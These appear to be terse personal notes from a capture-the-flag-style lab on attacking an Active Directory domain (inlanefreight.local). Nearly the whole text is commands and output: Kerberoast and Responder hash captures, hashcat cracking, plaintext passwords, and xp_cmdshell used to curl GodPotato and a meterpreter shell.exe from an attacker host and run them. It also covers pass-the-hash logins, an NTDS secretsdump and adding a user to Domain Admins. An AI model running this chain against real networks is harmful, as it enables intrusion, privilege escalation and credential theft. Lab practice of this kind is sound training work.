
#inital acces

http://ip/upload

| > webshell


### TICKET

``` shell
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$8A8D0372846A574EF510A953F095D175$5616FA4E2EDAF92CC1F8427AB9B12D6A9BF98B2CFDB68D43438615DF25A351B45AFFDF7DBE4A4C3B2080F90ECE459C9D619922F044D20908146A12315A606FCA58CF8561951CD1B69FB7DC4EBBFD585537AC3778E23A1F60C704B0261A0244171AFFF9A0A715927EA7B48C86B7D3D94792D6D8DE2CA348C80170CCB741ABCA2C9BA657BAF0FBB4455F24E89F6184E6C2FBEBEACE8CB765F2CB622B03682B0393A946D8AEF6F40337EF863C51DF6FFFA9527E79F42E2F594DCE50A0913E905CD055631E7D04AD60558FEA9211054CB65D8EA712C0847C42B27F0F6CE3D200CD455E9C403D01BFAE6F608DF2453F5FBA860D1E222D5A0249FA340AFD647972B223855331E8F18EB29BA48851B30CECB2E7679F4D6797294BFEFF4BC984092E8C84042F2A01A6183F028751259795EF78938A1720DD24153A9F8A0DC2EFFBB72A390B0ED20EECB5E3DEC3557E08E411D76977835DBABBD69A78FD901E42968A4F0ADBE143B07ABBCCA11E026181FE0833126390EBCB3805AF06A6485FA1F51D785380C681C94AB28F53067E23A1211B29EBA74900D372912EA2275D07F6786973CD7020262E1ABFE95007DC518D9DF5BF8CFD92BF17856702899D1253A41799044A1DBBD28A67DB1B5D59DE6E96EBB7500182C8AB4272607FA9219E78A0C55FD69AE94AA65A123BFB904E336075F43E520EDB02EAE9415E0412192EE30D2C6AB426977D92430F50161E2C7EEB5FC46927BF8FCC6B1F41634B5CB78CB524E9212597F6B60D39F9027A6283749C671730C6AB622F1A1101C8B014CE0296B5950944F101957606BF650B59781A20CBE49A71C7D8D39BBBDEF277957739D1F43F0CBFACCE4877C443D97E63680D54541B3D568194F05040A37B1161A2E6BA11325F05BF11FB261591666907C77C291DCE256D1B5CA79EF17AC06F8617A0D9EB133DFC31998F38AEF12AC382A10889EC6CB70CF608527D455945F8111A5621262BE5A0E9F03B310B0054CFBDF5DCB64661A6F73CF1179A46CA3529AD43B5716105E11EE9D522A2311421F7BDA5D078873FB59806324BC907F834EDE2220C3A1C9E232957011CDAD48E1CEA8566953052031C0B2F954F6825D84683FB0D2C907B9FC0CC041332FBC20FCE8A0F90977175CF44A27CEF1B8060C9B31616BC8A2424FA3B714317CC58168D108F6B3C78BF9246D49C9264E3567D9E1E37BEB1726844FC6FA6172CC12B142B5A49EBAC005696D1FAF8A6D681F2D85C0E92F8095508ABED7113DA2194D853975D4339143F5E370D895C6B1BD9EBC08AFECFEA0648611319763D1F3A767A90AC2F5114F3BF715F47D4AE10B1FF39C5BD9B80DD58B3826B284C1D9B93F297DD3A112EACA003D72C63AB4087B217602EDBC0AC40B1B7C753FE68E60ED82D7785E3A0C20F07B6CE1ADBBADA4D00B606BF3BCE6A4B9E53B602E6E6FA7A98DC8C52F76F6B35537208102ECCEFC6208FE113B0CD2CF282F357DDDD324B4269A60669325058B8EEFF169239A6CF8F8FC85AEA6D51528D
```

``` powershell
$user="svc_sql"
$passwd= convertto-securestring -AsPLainText -Force -String lucky7
   
$cred= new-object -typename System.Management.Automation.PSCredential ($user,$passwd)
$session = Enter-PSSession -computername "MS01.inlanefreight.local" -credential $cred
```



# AD Enumeration & Attacks - Skills Assessment Part II

``` bash
ssh htb-student@ip
```
ssh htb-student@ip
``` bash
responder -I ens224
```


``` bash
AB920::INLANEFREIGHT:68862bfb4e88f418:40E3C7984A08E2DC4964AC2589A496E4:010100000000000000C5C43E3E5DDB01667ACC808C832A0A00000000020008004C0031003800520001001E00570049004E002D0038004D004D004D005A003600430036004D003400450004003400570049004E002D0038004D004D004D005A003600430036004D00340045002E004C003100380052002E004C004F00430041004C00030014004C003100380052002E004C004F00430041004C00050014004C003100380052002E004C004F00430041004C000700080000C5C43E3E5DDB01060004000200000008003000300000000000000000000000002000004360D50752D12A0C37C4060DCB1D3BA81C0DF070B0B78FE19774C870C1EFDE110A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz 
- password : weasal

```

``` bash
evil-winrm -i 172.16.7.50 -u AB920 -p weasal

```

### user enumeration

```bash 
crackmapexec smb 172.16.7.3 -u 'AB920' -p 'weasal' --users

cmdb
	proto smb
	export creds users

cat hosts | awk -F, '{print $3}' > users.txt
BR086
Welcome1
```

``` bash
smbclient //172.16.7.3/'Department Shares' -U BR086%Welcome1
```

```
sql user :netdb
password: D@ta_bAse_adm1n!
```
#### connect to mssql using impacket
mssqlclient 

``` c
mssqlclient.py inlanefreight.local/netdb@172.16.7.60 
```
---> Prviliege escalate 

``` c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell curl http://172.16.7.240:8080/Godpotato -o c:\Windows\Tasks\potato.exe
SQL> xp_cmdshell C:\Windows\Tasks\potato.exe -cmd "cmd /c whoami"

### getting a revshell in meterpreter
SQL>xp_cmdshell curl http://172.16.7.240:8080/shell.exe
SQL>xp_cmdshell C:\Windows\Tasks\potato.exe -cmd "cmd /c C:\Windows\Tasks\shell.exe"


```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

```

### evil win rm to ms01 using hash

``` bash
evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```

user ct059 has genericall

``` powershell
curl http://172.16.7.240:8080/Inveigh.exe -o Inveigh.exe
.\Inveigh.exe


```

```
CT059::INLANEFREIGHT:CF4E0C9D180F306F:C0B76A215F2B938A1993599D01A7D78B:0101000000000000D3A44F65D15DDB017B6300C3470220430000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800D3A44F65D15DDB0106000400020000000800300030000000000000000000000000200000FA859D7D441D349C4F0A5307EE6385C21E77961223D92ADFFEBBA0AB78FFF0150A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

Power view

addd user ab920 to domain admins

``` bash
secretsdump.py -outputfile inlanehashees -just-dc AB920:weasal@172.16.7.3
```

get the flag of the dc
``` bash
evil-winrm -i 172.16.7.3 -u Administrator -H 234a798328eb83fda24119597ffba70b 
```

